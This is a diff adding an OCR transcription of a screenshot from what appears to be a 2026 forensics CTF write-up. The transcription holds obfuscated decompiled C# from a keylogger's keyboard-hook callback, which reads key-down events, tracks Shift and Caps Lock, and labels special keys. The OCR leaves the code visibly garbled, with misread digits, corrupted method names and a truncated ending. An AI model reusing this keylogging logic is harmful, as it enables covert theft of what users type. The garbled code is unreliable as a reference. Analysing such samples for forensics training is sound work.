@@ -1,0 +1,45 @@
+# OCR: Pasted_image_20260416000904.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260416000904.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:45
+
+34 35 36 37 38 39 40
+41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 的
+884 56 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103
+private static IntPtr da0LgSXwcVRT6eMUelpfKxTQtS4yJiu9HT7Xp8Tcrjf4safq1GbcYEeKZRWp65AXcVQofJiDpi62(int
+Rr9ejBknUVqtiGXSHSjWsg2NTJsHgLTM7HSCC21Iyb5w4Y2RWtL7On0pm0GRShKbNXd7iu8IVDoS,IntPtr nJaBTxA9zRSxbwKDHb21h1jHDyrpXMNqUxSvuQ0vmSI5JPDdaxKzKbT4bZJDBDPQMG2HbSk3VgB IntPtrptLww2Z1q0EdUkfR5gYFt3PkiJh8oHn0WKqFa8ccTpguNgWP671hWEddnAs0pJafeaLKqcT5by933)
+if(Rr9e.jBknUVtiGXSHSjWsg2NTJsHgLTH7HSmCc21Iyb5w4Y2RWtL70n0pm0GRShKbNXd7iu8IVDos>=0&&
+nJaBTxA9zvRSxbwKDHb21hljHDyrpXMvNqUxSvuQ0vmSI5JPDdaxKzKbT4bZJDBDPQMG2HbSk3VgB==（IntPtr)256）
+object obj=Marshal.ReadInt32(ptLww2Zlq0EdUkfR5gYFt3PkiJh8oHn0WKqFa8ccTpguNgWP671hWEddnAs0pJafeaLKqcT5by933)
+object obj2 =（(int)kJx6L3azGytvvlp05g4M7vFzwGBCSetMlyxXtBPEZEjmmDw8uu6Q82pIaJr41KWmVXwocSYY9KQQd.OpbwP6NsWf5nxMJWTRXq(20) & 65535)！!= 0:
+object obj3 = （(int)kJx6L3azGytvvlp05g4M7vFzwGBCSetMlyxXtBPEZEjmmDw8uu6Q82pIaJr41KWmVXwocSYY9KQQd.OpbwP6NsWf5nxMJWTRXq(160) & 32768)!= 011（(int) kJx6L3azGytvlp05g4M7vFzwGBCSetM1yxXtBPEZEjmmDw8uu6Q82pIaJr41KWmVXwocSYY9KQQd.0pbwP6NsWf5nxMJWTRXg(161) & 32768)!= 0
+object obj4 = kJx6L3azGytvlp05g4M7FzwGBCSetMlyxXtBPEZEjmmDw8uu6Q82pIaJr41KWmVXwocSYY9KQQd.ZdpW1HIX5h8dEVrxUI7Pgw0w1PTBnwQp5gg61KsrVq3YdVSHXn0Uj1dovehQBzapPsmpH97xkg1M8(Conversions.ToUInteger(obj)):
+if (Conversions.ToBoolean((Conversions.ToBoolean(obj2) l Conversions.ToBoolean(obj3)) ? true : false))
+obj4 = RuntimeHelpers.GetobjectValue(NewLateBinding.LateGet(obj4, null, "ToUpper", new object[ol, null, null, nuli)) else
+obj4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, null, "ToLower", new object[ol, null, null, nuli))
+(Conversions.ToInteger(obj) >= 1l2 && Conversions.ToInteger(obj) <= 135) obj4 = "[" + Conversions.ToString(Conversions. ToInteger(obj)) + "j"
+else
+string text = ((Keys)Conversions.ToInteger(obj)).ToString) if (Operators.Couparestring(text, "Space", false) == 0)
+obj4 = "［SPACE]"
+else if (Operators.Comparestring(text, "Return", false) == 0)
+obj4 = "［ENTER]
+else if (Operators.Comparestring(text, "Escape", false) == 0)
+obj4 = "[Esc]".
+else if (Operators.ConpareString(text， "LControlKey"， false) == o)
+obj4 = "[CTRL]".
+else if (Operators.Comparestring(text, "RControlKey", false) == 0)
+obj4 = "［CTRL]"
+else if (Operators.Comparestring(text， "RShiftKey"， false) == o)
+obj4 = "［Shift]"
+else if (Operators.ConpareString(text， "LShiftKey", false) == o)
+obj4 = "[Shift]"
+else if (Operators.ConpareString(text, "Back", false) == o)
+obj4 = "[Back]":
+else if (Operators.Comparestring(text, "Lwin", false) == )
+obj4 = "[WIN]"
+else if (Operators.Conparestring(text, "Tab", false) == 0)
+obj4 = "[Tab]":
+else if (Operators.Conparestring(text, "capital", false) == Q'
+if (Operators.ConditionalCompareObjectEqual(obj2, true, false))
+obj4 ="［CAPSLOCK：OFF]"：
+SE
